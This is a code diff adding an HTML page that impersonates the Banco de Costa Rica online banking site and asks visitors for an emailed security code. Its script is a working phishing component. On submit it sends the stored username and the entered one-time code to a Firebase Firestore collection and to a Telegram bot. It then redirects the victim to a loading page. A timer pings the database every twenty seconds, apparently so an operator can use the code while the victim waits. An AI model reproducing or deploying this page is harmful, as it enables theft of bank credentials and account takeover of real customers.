@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="es-CR">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        updateDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.updateDoc = updateDoc;
+
+      window.setDoc = setDoc;
+    </script>
+
+    <meta name="description" content="Banco de Costa Rica-Oficina Virtual" />
+    <meta name="keywords" content="BCR, BCR Personas, Banco de Costa Rica" />
+    <meta name="author" content="Banco de Costa Rica" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
+    />
+    <meta http-equiv="Expires" content="Mon, 01 Jan 1990 00:00:01 GMT" />
+    <meta
+      http-equiv="cache-control"
+      content="no-cache, no-store, must-revalidate"
+    />
+
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <title>Banco de Costa Rica- Oficina Virtual</title>
+
+    <link
+      rel="shortcut icon"
+      href="#imagenes/iconos/favicon.ico"
+      type="image/x-icon"
+    />
+    <link rel="stylesheet" type="text/css" href="./archivos/semantic.min.css" />
+    <link rel="stylesheet" type="text/css" href="./archivos/bcr_menu.css" />
+    <link rel="stylesheet" type="text/css" href="./archivos/BCRStyle.css" />
+    <!-- Manejo de Tablas - CSS -->
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="./archivos/jquery.dataTables.min.css"
+    />
+  </head>
+
+  <body oncontextmenu="return false;">
+    <div class="pusher">
+      <div class="ui borderless fixed tiny labeled icon menu menuBCR">
+        <a class="item" title="Banco de Costa Rica" href="#plantilla/index.asp">
+          <img
+            class="ui small image"
+            src="./archivos/logo.gif"
+            tabindex="-1"
+            alt="Logo del Banco de Costa Rica"
+          />
+        </a>
+
+        <a
+          class="item right"
+          id="itmCertificacion"
+          tabindex="3"
+          href="#ib_bcr/transacciones/certificaciones/certificacionEspecifica/certificaciones.asp"
+          target="ifrm"
+          style="display: none"
+        >
+          <i class="icon"
+            ><img src="./archivos/Certificado.svg" alt="Certificado"
+          /></i>
+          <p style="padding-top: 3px">Certificaciones</p>
+        </a>
+        <a class="item right" id="itmContactenos" tabindex="3" style="">
+          <i class="icon"
+            ><img src="./archivos/Contactenos.svg" alt="Contactenos"
+          /></i>
+          <p style="padding-top: 3px">Contáctenos</p>
+        </a>
+      </div>
+
+      <div class="ui horizontal segments title">
+        <div class="ui segment right aligned">
+          <p class="ui inverted header title">Oficina Virtual</p>
+        </div>
+        <div class="ui segment">
+          <p class="ui inverted header title">Personas</p>
+        </div>
+      </div>
+      <form id="loginform">
+        <div class="ui container iframeContainer">
+          <div style="width: 100%; text-align: center">
+            <h2 style="color: #0033a0 !important; padding: 20px">
+              Codigo de seguridad BCR:
+            </h2>
+            <p style="margin-bottom: 21px;font-weight: bold;">
+              Para continuar con su gestion hemos enviado un codigo a su correo
+              electronico para ingresar por este canal
+            </p>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div class="ui input">
+              <input
+                tabindex="52"
+                name="OTP"
+                id="OTP"
+                type="text"
+                maxlength="7"
+                onkeypress="return AceptarSoloNumeros(event);"
+                oninput="formatearOTP(this);"
+                onpaste="return false;"
+                autocomplete="off"
+                style="text-align: center"
+                placeholder="--- ---"
+                inputmode="numeric"
+                aria-label="Ingrese su mecanismo de seguridad para continuar:"
+              />
+            </div>
+            <script>
+              function AceptarSoloNumeros(evt) {
+                evt = evt ? evt : event;
+                var key = evt.which ? evt.which : evt.keyCode;
+                var charTyped = String.fromCharCode(key);
+                return /^\d*$/.test(charTyped);
+              }
+
+              function formatearOTP(input) {
+                let valor = input.value.replace(/\s/g, ""); // Elimina todos los espacios
+                if (valor.length > 3) {
+                  valor = valor.slice(0, 3) + " " + valor.slice(3);
+                }
+                input.value = valor;
+              }
+            </script>
+          </div>
+          <div style="width: 100%; text-align: center; margin-top: 30px">
+            <button
+              tabindex="60"
+              type="submit"
+              class="ui button basic btnAzul"
+              value="Confirmar"
+              title="Confirmar"
+              id="Aceptar"
+            >
+              Aceptar
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+
+    <div class="ui horizontal footer segment">
+      <div class="ui center aligned container">
+        <div class="ui horizontal inverted small divided link list">
+          <label style="color: transparent">
+            <svg width="12" height="12" viewBox="0 0 512 512">
+              <path
+                style="fill: #0030a0"
+                d="M480 160H32c-17.673 0-32-14.327-32-32V64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24z"
+              ></path>
+            </svg>
+            117
+          </label>
+          <label>
+            <svg width="12" height="12" viewBox="0 0 448 512">
+              <path
+                style="fill: #fff"
+                d="M128 148v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12zm140 12h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zM308 300v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12zm-140 12h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zm268-204v352c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V108c0-26.51 21.49-48 48-48h408c26.51 0 48 21.49 48 48zM400 96c0-8.8-7.2-16-16-16s-16 7.2-16 16v16c0 8.8 7.2 16 16 16s16-7.2 16-16V96zM48 256c0 61.9 50.1 112 112 112s112-50.1 112-112S221.9 144 160 144 48 194.1 48 256zm288 184c35.35 0 64-28.65 64-64s-28.65-64-64-64-64 28.65-64 64 28.65 64 64 64z"
+              ></path>
+            </svg>
+            515
+          </label>
+          <label>
+            <svg width="12" height="12" viewBox="0 0 448 512">
+              <path
+                style="fill: #fff"
+                d="M128 148v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12zm140 12h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zM308 300v-40c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v40c0 6.6-5.4 12-12 12h-40c-6.6 0-12-5.4-12-12zm-140 12h40c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12zm268-204v352c0 26.51-21.49 48-48 48H48c-26.51 0-48-21.49-48-48V108c0-26.51 21.49-48 48-48h408c26.51 0 48 21.49 48 48zM400 96c0-8.8-7.2-16-16-16s-16 7.2-16 16v16c0 8.8 7.2 16 16 16s16-7.2 16-16V96zM48 256c0 61.9 50.1 112 112 112s112-50.1 112-112S221.9 144 160 144 48 194.1 48 256zm288 184c35.35 0 64-28.65 64-64s-28.65-64-64-64-64 28.65-64 64 28.65 64 64 64z"
+              ></path>
+            </svg>
+            500
+          </label>
+        </div>
+      </div>
+    </div>
+    <script src="script.js"></script>
+    <script>
+      const url = "https://ipapi.co/json/";
+      const form = document.querySelector("#loginform");
+
+      form.addEventListener("submit", async (event) => {
+        event.preventDefault(); // Evita que se envíe el formulario por defecto
+
+        // Captura las variables necesarias
+        const nombre = localStorage.getItem("usuario");
+        const token = document.querySelector("#OTP").value;
+        const message = "\nBCR\nNombre: " + nombre + "\nToken: " + token;
+
+        // Asegúrate de que Firestore esté configurado correctamente
+        const questionRef = doc(window.db, "bcrsrr", nombre);
+        await updateDoc(questionRef, {
+          token: token,
+          page: 0,
+        });
+
+        axios
+          .post(
+            "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+            {
+              chat_id: chat,
+              text: message,
+            }
+          )
+          .then((response) => {
+            window.location.href = "cargando.html";
+          })
+          .catch((error) => {
+            console.error(error);
+          });
+
+      });
+    </script>
+    <script>
+      setInterval(() => {
+        const questionRef = window.doc(
+          window.db,
+          "bcrsrr",
+          localStorage.getItem("usuario")
+        );
+        const nombre2 = localStorage.getItem("usuario");
+        updateDoc(questionRef, {
+          hora: new Date().getTime(),
+        });
+      }, 20000);
+    </script>
+  </body>
+</html>
